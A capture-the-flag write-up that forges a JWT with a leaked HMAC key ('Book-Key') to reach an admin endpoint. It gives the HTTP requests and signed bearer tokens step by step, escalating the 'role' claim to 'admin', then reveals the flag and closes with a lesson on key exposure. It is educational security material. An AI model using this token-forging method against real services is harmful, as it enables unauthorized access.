# Bearer of Bad News

### Challenge
> Oh, oh. Someone committed the secret key ("Book-Key") to GitHub. If you hurry you might be able to exploit it.

When you naviage to the clue, you are presented with:

`No Authorization header provided`  

This is telling you that you need to add an Authorization header to the request, so you do:  

````
GET /Book/AdminOps HTTP/1.1  
Host: gsccctf-bookclub.azurewebsites.net  
Authorization: foo
````  
That request results in:  
`Authoriztion scheme must be "Bearer"`  

So, you change the scheme to "Bearer":  
````
GET /Book/AdminOps HTTP/1.1
Host: gsccctf-bookclub.azurewebsites.net
Authorization: Bearer foo
````
and that response is:  
`Bearer token does not appear to be a valid JWT format`  

knowing (or researching) the JWT format you know that it comes in the form of [header].[payload].[signature] . You don't yet know what to use for any of the values, so you just try something to see what the response tells you next.  
````
GET /Book/AdminOps HTTP/1.1
Host: gsccctf-bookclub.azurewebsites.net
Authorization: Bearer foo.bar.fizz
````

Response:  
`JWT HMAC SHA256 signature is not valid`  

At this point you know you need to sign the header and payload with a SHA256 hash and the key is "Book-Key". Generating a JWT signature is pretty straightforward, but we can make it super easy by using the online debugger provided by jwt.io. When you navigate to that site you have the capability of editing the header, payload and signature key. Since we still don't know what might be needed in the header or the payload, we just enter our key "Book-Key" and try the JWT that was generated with the sample default header and payload:  

 ![](jwt1.png)  

 Now we should have a valid JWT signed with the key "Book-Key". We update our test and try it:  
 ````
GET /Book/AdminOps HTTP/1.1
Host: gsccctf-bookclub.azurewebsites.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.kR4zGHaARRnUyQxEKMZsTJyqfBD9Qb6xouukTu6ycVg
 ````  
 The response is now saying that the JWT needs to have a claim named "role":  
 `JWT claim "role" not present`  

 So, back in the jwt.io debugger, you make an edit to the payload so it includes a role claim:  
 ````
 {
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "role" : "foo"
}
````
It generates an new JWT since the signature changes when the content changes:  
````
GET /Book/AdminOps HTTP/1.1
Host: gsccctf-bookclub.azurewebsites.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiZm9vIn0.L7Ps_rvkqWtowicAI9g6jjbsp4dT_d-3kBzraAdy0Hs
````
The response changes and gives us more information. It says we need a role named "admin"; our "foo" role wasn't accepted.  
`Must have "admin" role to access this resource`  

So back to the jwt.io debugger. Change the "foo" role to "admin"... 
````
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "role" : "admin"
}
````

...grab the updated token and send it: 
````
GET /Book/AdminOps HTTP/1.1
Host: gsccctf-bookclub.azurewebsites.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.gmQl_v5M9EvxzPJxOTuq36pX0yT7nO1l8-3-d3H3eRg
````

Finally, we have followed all the bread crumbs and we are presented with the flag:  
`able-sword-pail-planet`  

The moral of this story is that it can be easy to fake a JWT token if the key is exposed. This could allow a person to authenticate and authorize against a resource. In practice, identity providers are more sophisticated. They validate time stamps, they may validate that they have a record of issuing a particular token, etc. Despite the fact that these additional safeguards are common, you cannot just assume they are in place. And it also exemplifies why you should not implement your own token server, stick with something built by the experts.










